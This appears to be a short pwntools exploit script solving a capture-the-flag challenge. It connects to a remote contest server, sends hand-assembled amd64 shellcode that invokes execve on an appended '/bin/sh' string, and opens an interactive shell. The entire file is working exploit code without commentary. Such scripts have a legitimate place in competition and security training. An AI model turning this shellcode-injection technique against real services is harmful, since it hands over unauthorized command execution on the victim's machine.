from pwn import *

context(log_level="debug", arch="amd64", os="linux")
io = process("./pwn")
io = remote("node2.tgctf.woooo.tech",30958)
io.recv()
#gdb.attach(io)
shellcode = asm(
    """add rdi,10
              add rax,59
              syscall              
"""
)
shellcode += b"/bin/sh\x00"
io.send(shellcode)
print(len(shellcode))
io.interactive()
